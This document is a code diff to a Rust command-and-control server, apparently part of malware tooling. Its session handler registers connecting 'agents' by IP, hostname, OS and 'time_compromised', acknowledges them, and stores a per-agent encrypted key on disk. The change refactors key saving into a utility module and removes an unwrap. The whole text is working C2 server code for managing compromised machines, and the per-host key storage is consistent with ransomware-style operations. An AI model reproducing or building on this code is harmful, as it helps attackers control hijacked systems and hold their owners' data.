@@ -1,5 +1,3 @@
-use std::fs::File;
-use std::io::Write;
 use tokio::net::TcpStream;
 use tokio_util::codec::{FramedRead, FramedWrite};
 use futures::{SinkExt, StreamExt};
@@ -35,7 +33,7 @@ pub async fn handle_session(stream: TcpStream, addr: SocketAddr, c2: Arc<Mutex<C
             // Create/register the agent in the C2
             let mut c2 = c2.lock().await;
             let session = Uuid::new_v4().to_string();
-            let agent_id = c2.create_agent(&ip, &hostname, &os, &time_compromised, &session).await.unwrap();
+            let agent_id = c2.create_agent(&ip, &hostname, &os, &time_compromised, &session).await;
             // Respond to the agent with an Ack (includes its agent ID and session info)
             let ack = ServerMessage::Ack {
                 agent_id,
@@ -44,7 +42,7 @@ pub async fn handle_session(stream: TcpStream, addr: SocketAddr, c2: Arc<Mutex<C
             };
 
             // Handle key storage
-            let _ = save_key(agent_id, &key);
+            let _ = crate::utils::utils::save_key(agent_id, &key);
 
             let _ = framed_tx.send(ack).await;
         }
@@ -127,9 +125,3 @@ pub async fn handle_session(stream: TcpStream, addr: SocketAddr, c2: Arc<Mutex<C
 }
 
 
-fn save_key(agent_id: u64, encrypted_key: &[u8]) -> std::io::Result<()> {
-    let filename = format!("keys/agent_{agent_id}_key.bin");
-    let mut file = File::create(filename)?;
-    file.write_all(encrypted_key)?;
-    Ok(())
-}
